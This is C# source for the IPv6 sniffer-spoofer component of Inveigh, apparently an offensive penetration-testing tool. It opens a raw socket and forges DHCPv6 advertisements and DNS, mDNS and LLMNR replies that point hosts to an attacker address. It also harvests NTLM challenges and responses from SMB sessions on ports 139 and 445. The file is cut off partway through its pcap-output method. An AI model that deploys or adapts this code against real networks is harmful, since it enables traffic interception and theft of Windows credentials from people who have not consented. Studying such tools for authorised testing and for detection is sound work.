using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Collections;

namespace Inveigh
{
    class SnifferIPv6
    {
        public static FileStream pcapFile = null;
        static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());

        public static void SnifferSpoofer(string ipV4, string snifferIP, string snifferMAC, string spooferIP, string spooferIPv6, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] mdnsTypes, string[] nbnsTypes, string dhcpv6DomainSuffix, string[] pcapTCP, string[] pcapUDP)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
            byte[] byteData = new byte[65534];
            Socket snifferSocket;
            EndPoint snifferEndPointRemote;
            IPAddress destinationIPAddress = IPAddress.Parse(snifferIP);
            int packetLength;
            int dhcpv6IPIndex = 1;
            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(dhcpv6DomainSuffix);
            Random ipv6Random = new Random();
            int ipv6RandomValue = ipv6Random.Next(1, 9999);
            byte[] snifferMACArray = new byte[6];
            snifferMAC = snifferMAC.Insert(2, "-").Insert(5, "-").Insert(8, "-").Insert(11, "-").Insert(14, "-");
            int i = 0;

            foreach (string character in snifferMAC.Split('-'))
            {
                snifferMACArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                i++;
            }

            try
            {
                snifferSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                snifferSocket.ReceiveBufferSize = 65534;
                IPEndPoint snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                snifferSocket.Bind(snifferEndPoint);
                snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
                snifferEndPointRemote = new IPEndPoint(IPAddress.IPv6Any, 0);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting packet sniffer, check if shell has elevated privilege or set -Elevated N for unprivileged mode.", DateTime.Now.ToString("s")));
                }

                throw;
            }         

            while (!Program.exitInveigh)
            {

                try
                {

                    try
                    {
                        packetLength = snifferSocket.ReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref snifferEndPointRemote);
                    }
                    catch
                    {
                        packetLength = 0;
                    }

                    if (packetLength > 0)
                    {
                        MemoryStream memoryStream = new MemoryStream(byteData, 0, packetLength);
                        BinaryReader binaryReader = new BinaryReader(memoryStream);
                        byte[] sourceIP = { 0x00, 0x00, 0x00, 0x00 };
                        byte[] destinationIP = { 0x00, 0x00, 0x00, 0x00 };
                        IPAddress sourceIPAddress = IPAddress.Parse(snifferEndPointRemote.ToString().Substring(0, snifferEndPointRemote.ToString().Length - 2));                      
                        int protocolNumber = (int)snifferSocket.ProtocolType;

                        switch (protocolNumber)
                        {
                            case 6:
                                uint tcpSourcePort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint tcpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(8);
                                byte tcpHeaderLength = binaryReader.ReadByte();
                                tcpHeaderLength >>= 4;
                                tcpHeaderLength *= 4;
                                byte tcpFlags = binaryReader.ReadByte();
                                binaryReader.ReadBytes(tcpHeaderLength - 15);
                                byte[] payloadBytes = binaryReader.ReadBytes(packetLength);
                                string challenge = "";
                                string session = "";
                                string tcpSession = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);
                                string tcpFlagsBinary = Convert.ToString(tcpFlags, 2);
                                tcpFlagsBinary = tcpFlagsBinary.PadLeft(8, '0');

                                if (String.Equals(tcpFlagsBinary.Substring(6, 1), "1") && String.Equals(tcpFlagsBinary.Substring(3, 1), "0") && destinationIPAddress.ToString() == snifferIP)
                                {

                                    lock (Program.outputList)
                                    {
                                        Program.outputList.Add(String.Format("[+] [{0}] TCP({1}) SYN packet from {2}", DateTime.Now.ToString("s"), tcpDestinationPort, tcpSession));
                                    }

                                }

                                switch (tcpDestinationPort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), destinationIPAddress.ToString(), Convert.ToString(tcpSourcePort), "139");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "139");
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), destinationIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "445");
                                        }

                                        break;
                                }

                                switch (tcpSourcePort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {

                                            if(!String.Equals(destinationIP,snifferIP))
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }
                                            else
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }

                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!String.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {

                                            if (!String.Equals(destinationIP, snifferIP))
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }
                                            else
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }

                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;
                                }

                                break;

                            case 17:
                                byte[] udpSourcePort = binaryReader.ReadBytes(2);
                                uint endpointSourcePort = Util.DataToUInt16(udpSourcePort);
                                uint udpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint udpLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(2);
                                byte[] udpPayload;

                                try
                                {
                                    udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                                }
                                catch
                                {
                                    udpPayload = new byte[2];
                                }

                                switch (udpDestinationPort)
                                {

                                    case 547:
                                        byte[] dhcpv6MessageTypeID = new byte[1];
                                        Buffer.BlockCopy(udpPayload, 0, dhcpv6MessageTypeID, 0, 1);
                                        byte[] dhcpv6TransactionID = new byte[3];
                                        Buffer.BlockCopy(udpPayload, 1, dhcpv6TransactionID, 0, 3);
                                        byte[] dhcpv6ClientIdentifier = new byte[18];
                                        Buffer.BlockCopy(udpPayload, 10, dhcpv6ClientIdentifier, 0, 18);
                                        byte[] dhcpv6ClientMACData = new byte[6];
                                        Buffer.BlockCopy(udpPayload, 22, dhcpv6ClientMACData, 0, 6);
                                        string dhcpv6ClientMAC = BitConverter.ToString(dhcpv6ClientMACData).Replace("-", ":");
                                        byte[] dhcpv6IAID = new byte[4];

                                        if ((int)dhcpv6MessageTypeID[0] == 1)
                                        {
                                            Buffer.BlockCopy(udpPayload, 32, dhcpv6IAID, 0, 4);
                                        }
                                        else
                                        {
                                            Buffer.BlockCopy(udpPayload, 46, dhcpv6IAID, 0, 4);
                                        }
                                        
                                        Array.Reverse(udpSourcePort);
                                        byte[] dhcpv6IPSniffer = IPAddress.Parse(snifferIP).GetAddressBytes();
                                        byte[] dhcpv6ClientIP = new byte[16];
                                        string dhcpv6LeaseIP = "";
                                        byte[] dhcpv6OptionData = new byte[2];
                                        byte[] dhcpv6OptionLength = new byte[2];
                                        string dhcpv6FQDN = "";
                                        string dhcpv6MessageType = "";
                                        string dhcpv6ResponseMessage = "";
                                        string dhcpv6ResponseMessage2 = "";

                                        if ((int)dhcpv6MessageTypeID[0] == 1 || (int)dhcpv6MessageTypeID[0] == 3 || (int)dhcpv6MessageTypeID[0] == 5)
                                        {

                                            for (i = 12; i < udpPayload.Length; i++)
                                            {

                                                if (Util.UInt16DataLength(i, udpPayload) == 39)
                                                {
                                                    dhcpv6FQDN = Util.ParseNameQuery((i + 4), udpPayload);
                                                }

                                            }

                                            int index = BitConverter.ToString(udpPayload).Replace("-", String.Empty).IndexOf("4D53465420352E30");

                                            if (index >= 0 && Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                                            {
                                                dhcpv6LeaseIP = Program.dhcpv6ClientTable[dhcpv6ClientMAC].ToString();
                                                dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                                            }
                                            else if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                                            {
                                                dhcpv6LeaseIP = "fe80::" + ipv6RandomValue + ":" + dhcpv6IPIndex;
                                                dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                                                Program.dhcpv6ClientTable.Add(dhcpv6ClientMAC, dhcpv6LeaseIP);
                                                dhcpv6IPIndex++;

                                                lock (Program.dhcpv6FileList)
                                                {
                                                    Program.dhcpv6FileList.Add(dhcpv6ClientMAC + "," + dhcpv6LeaseIP);
                                                }

                                            }

                                            if (Program.enabledDHCPv6)
                                            {

                                                if (index > 0)
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x02, 0x23 }), 0, 2);
                                                        ms.Write(udpSourcePort, 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);

                                                        if ((int)dhcpv6MessageTypeID[0] == 1)
                                                        {
                                                            ms.Write((new byte[1] { 0x02 }), 0, 1);
                                                        }
                                                        else if ((int)dhcpv6MessageTypeID[0] == 3)
                                                        {
                                                            ms.Write((new byte[1] { 0x07 }), 0, 1);
                                                        }
                                                        else if ((int)dhcpv6MessageTypeID[0] == 5)
                                                        {
                                                            ms.Write((new byte[1] { 0x07 }), 0, 1);
                                                        }

                                                        ms.Write(dhcpv6TransactionID, 0, dhcpv6TransactionID.Length);
                                                        ms.Write(dhcpv6ClientIdentifier, 0, dhcpv6ClientIdentifier.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x02, 0x00, 0x0a }), 0, 4);
                                                        ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x01 }), 0, 4);
                                                        ms.Write(snifferMACArray, 0, snifferMACArray.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x17, 0x00, 0x10 }), 0, 4);
                                                        ms.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);
                                                        
                                                        if (!String.IsNullOrEmpty(dhcpv6DomainSuffix))
                                                        {
                                                            ms.Write((new byte[2] { 0x00, 0x18 }), 0, 2);
                                                            ms.Write(Util.IntToByteArray2(dhcpv6DomainSuffixData.Length), 0, 2);
                                                            ms.Write(dhcpv6DomainSuffixData, 0, dhcpv6DomainSuffixData.Length);
                                                        }

                                                        ms.Write((new byte[4] { 0x00, 0x03, 0x00, 0x28 }), 0, 4);
                                                        ms.Write(dhcpv6IAID, 0, dhcpv6IAID.Length);
                                                        ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x05, 0x00, 0x18 }), 0, 12);
                                                        ms.Write(dhcpv6ClientIP, 0, dhcpv6ClientIP.Length);
                                                        ms.Write((new byte[8] { 0x00, 0x00, 0x01, 0x2c, 0x00, 0x00, 0x01, 0x2c }), 0, 8);
                                                        ms.Position = 4;
                                                        ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
                                                        byte[] pseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
                                                        UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, ms.ToArray());
                                                        ms.Position = 6;
                                                        byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                                                        Array.Reverse(packetChecksum);
                                                        ms.Write(packetChecksum, 0, 2);
                                                        Socket dhcpv6SendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                                                        dhcpv6SendSocket.SendBufferSize = 1024;
                                                        IPEndPoint dhcpv6EndPoint = new IPEndPoint(sourceIPAddress, 546);
                                                        dhcpv6SendSocket.SendTo(ms.ToArray(), dhcpv6EndPoint);
                                                        dhcpv6SendSocket.Close();
                                                    }

                                                }

                                            }

                                            if (!Program.enabledDHCPv6 && (int)dhcpv6MessageTypeID[0] == 1)
                                            {
                                                dhcpv6MessageType = "solicitation";
                                                dhcpv6ResponseMessage = "spoofer disabled";
                                            }
                                            else if (index < 0)
                                            {
                                                dhcpv6MessageType = "solicitation";
                                                dhcpv6ResponseMessage = "vendor ignored";
                                            }
                                            else if ((int)dhcpv6MessageTypeID[0] == 1)
                                            {
                                                dhcpv6MessageType = "solicitation";
                                                dhcpv6ResponseMessage = "response sent";
                                                dhcpv6ResponseMessage2 = "advertised";
                                            }
                                            else if ((int)dhcpv6MessageTypeID[0] == 3)
                                            {
                                                dhcpv6MessageType = "request";
                                                dhcpv6ResponseMessage = "response sent";
                                                dhcpv6ResponseMessage2 = "leased";
                                            }
                                            else if ((int)dhcpv6MessageTypeID[0] == 5)
                                            {
                                                dhcpv6MessageType = "renew";
                                                dhcpv6ResponseMessage = "response sent";
                                                dhcpv6ResponseMessage2 = "renewed";
                                            }                

                                            lock (Program.outputList)
                                            {

                                                if (!String.IsNullOrEmpty(dhcpv6FQDN))
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2}({3}) [{4}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6FQDN, dhcpv6ResponseMessage));
                                                }
                                                else
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2} [{3}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6ResponseMessage));
                                                }

                                                if (String.Equals(dhcpv6ResponseMessage, "response sent"))
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} {2} to {3}", DateTime.Now.ToString("s"), dhcpv6LeaseIP, dhcpv6ResponseMessage2, dhcpv6ClientMAC));
                                                }

                                            }

                                        }

                                        break;

                                    case 53:
                                        string dnsResponseMessage = "";
                                        Array.Reverse(udpSourcePort);
                                        byte[] ttlDNS = BitConverter.GetBytes(Int32.Parse(dnsTTL));
                                        Array.Reverse(ttlDNS);
                                        byte[] dnsTransactionID = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, 0, dnsTransactionID, 0, 2);
                                        string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
                                        byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
                                        System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);
                                        int udpResponseLength = dnsRequest.Length + dnsRequest.Length + spooferIP.Length + 27;
                                        string[] dnsRequestSplit = dnsRequestHost.Split('.');

                                        if (dnsRequestSplit != null && dnsRequestSplit.Length > 0)
                                        {
                                            dnsResponseMessage = Util.CheckRequest(dnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "DNS");
                                        }

                                        if (Program.enabledDNS && String.Equals(dnsResponseMessage, "response sent"))
                                        {

                                            using (MemoryStream ms = new MemoryStream())
                                            {
                                                ms.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                                                ms.Write(udpSourcePort, 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                ms.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                                                ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                ms.Write(dnsRequest, 0, dnsRequest.Length);
                                                ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                                                ms.Write(dnsRequest, 0, dnsRequest.Length);
                                                ms.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                                                ms.Write(ttlDNS, 0, 4);
                                                ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                ms.Position = 4;
                                                ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
                                                byte[] dnsPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
                                                UInt16 checkSum = Util.GetPacketChecksum(dnsPseudoHeader, ms.ToArray());
                                                ms.Position = 6;
                                                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                                                Array.Reverse(packetChecksum);
                                                ms.Write(packetChecksum, 0, 2);
                                                Socket dnsSendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                                                dnsSendSocket.SendBufferSize = 1024;
                                                IPEndPoint dnsEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                dnsSendSocket.SendTo(ms.ToArray(), dnsEndPoint);
                                                dnsSendSocket.Close();
                                            }

                                        }

                                        if (String.Equals(destinationIPAddress.ToString(), snifferIP.ToString()))
                                        {

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] DNS request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), dnsRequestHost, sourceIPAddress, dnsResponseMessage));
                                            }

                                        }
                                        else
                                        {

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] DNS request for {1} sent to {2} [{3}]", DateTime.Now.ToString("s"), dnsRequestHost, destinationIPAddress, "outgoing query"));
                                            }

                                        }

                                        break;

                                    case 5353:
                                        string mdnsResponseMessage = "";
                                        byte[] mdnsType = new byte[2];

                                        if (BitConverter.ToString(udpPayload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(udpPayload).Substring(12,23), "00-01-00-00-00-00-00-00"))
                                        {
                                            udpLength += 10;
                                            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                            Array.Reverse(ttlMDNS);
                                            byte[] mdnsTransactionID = new byte[2];
                                            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                            if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                            {
                                                mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS");
                                            }

                                            if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                            {

                                                if (Array.Exists(mdnsTypes, element => element == "QU"))
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                                        ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                        ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                                        ms.Write(ttlMDNS, 0, 4);
                                                        ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                        Socket mdnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                        mdnsSendSocket.SendBufferSize = 1024;
                                                        IPEndPoint mdnsEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
                                                        mdnsSendSocket.SendTo(ms.ToArray(), mdnsEndPoint);
                                                        mdnsSendSocket.Close();
                                                    }

                                                }
                                                else
                                                {
                                                    mdnsResponseMessage = "mDNS type disabled";
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                            }

                                        }
                                        else if (BitConverter.ToString(udpPayload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00") || 
                                            String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
                                        {
                                            udpLength += 4;
                                            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                            Array.Reverse(ttlMDNS);
                                            byte[] mdnsTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                            if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                            {
                                                mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS");
                                            }

                                            if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                            {

                                                if (Array.Exists(mdnsTypes, element => element == "QM"))
                                                {

                                                    using (MemoryStream ms = new MemoryStream())
                                                    {
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write((new byte[2] { 0x14, 0xe9 }), 0, 2);
                                                        ms.Write(Util.IntToByteArray2((int)udpLength), 0, 2);
                                                        ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                        ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
                                                        ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                        ms.Write(mdnsRequest, 0, mdnsRequest.Length);
                                                        ms.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
                                                        ms.Write(ttlMDNS, 0, 4);
                                                        ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                                                        ms.Write(spooferIPData, 0, spooferIPData.Length);
                                                        Socket mdnsSendSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                                                        mdnsSendSocket.SendBufferSize = 1024;
                                                        IPEndPoint mdnsEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
                                                        mdnsSendSocket.SendTo(ms.ToArray(), mdnsEndPoint);
                                                        mdnsSendSocket.Close();
                                                    }

                                                }
                                                else
                                                {
                                                    mdnsResponseMessage = "mDNS type disabled";
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                            }

                                        }

                                        break;

                                    case 5355:
                                        string llmnrResponseMessage = "";
                                        byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
                                        Array.Reverse(ttlLLMNR);
                                        byte[] llmnrType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);

                                        if (BitConverter.ToString(llmnrType) == "00-1C")
                                        {
                                            udpLength += (byte)(udpPayload.Length - 2);
                                            Array.Reverse(udpSourcePort);
                                            byte[] llmnrTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                                            byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                                            byte[] llmnrRequestLength = new byte[1];
                                            System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                            System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                            string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
                                            llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "LLMNRv6");

                                            if (Program.enabledLLMNRv6 && String.Equals(llmnrResponseMessage, "response sent"))
                                            {

                                                using (MemoryStream ms = new MemoryStream())
                                                {
                                                    ms.Write((new byte[2] { 0x14, 0xeb }), 0, 2);
                                                    ms.Write(udpSourcePort, 0, 2);
                                                    ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                    ms.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                                                    ms.Write(llmnrTransactionID, 0, llmnrTransactionID.Length);
                                                    ms.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                                                    ms.Write(llmnrRequestLength, 0, 1);
                                                    ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                                                    ms.Write(llmnrRequestLength, 0, 1);
                                                    ms.Write(llmnrRequest, 0, llmnrRequest.Length);
                                                    ms.Write((new byte[5] { 0x00, 0x00, 0x1c, 0x00, 0x01 }), 0, 5);
                                                    ms.Write(ttlLLMNR, 0, 4);
                                                    ms.Write((new byte[2] { 0x00, 0x10 }), 0, 2);
                                                    ms.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);
                                                    ms.Position = 4;
                                                    ms.Write(Util.IntToByteArray2((int)ms.Length), 0, 2);
                                                    byte[] llmnrPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)ms.Length);
                                                    Socket llmnrSendSocket = new Socket(AddressFamily.InterNetworkV6, SocketType.Raw, ProtocolType.Udp);
                                                    UInt16 checkSum = Util.GetPacketChecksum(llmnrPseudoHeader, ms.ToArray());
                                                    ms.Position = 6;
                                                    byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                                                    Array.Reverse(packetChecksum);
                                                    ms.Write(packetChecksum, 0, 2);
                                                    llmnrSendSocket.SendBufferSize = 1024;
                                                    IPEndPoint llmnrEndPoint = new IPEndPoint(sourceIPAddress, (int)endpointSourcePort);
                                                    llmnrSendSocket.SendTo(ms.ToArray(), llmnrEndPoint);
                                                    llmnrSendSocket.Close();
                                                }

                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] LLMNR request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
                                            }

                                        }

                                        break;

                                }

                                break;         
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Packet sniffing error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void PcapOutput(uint totalLength, byte[] byteData)
        {

            if (byteData != null && byteData.Length > 0)
            {
                TimeSpan pcapEpochTime = DateTime.UtcNow - new DateTime(1970, 1, 1);
                byte[] pcapLength = BitConverter.GetBytes(totalLength + 14);
                byte[] pcapEpochTimeSeconds = BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds);

                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write((BitConverter.GetBytes((int)Math.Truncate(pcapEpochTime.TotalSeconds))), 0, (BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds)).Length);
                    ms.Write((BitConverter.GetBytes(pcapEpochTime.Milliseconds)), 0, (BitConverter.GetBytes(pcapEpochTime.Milliseconds)).Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
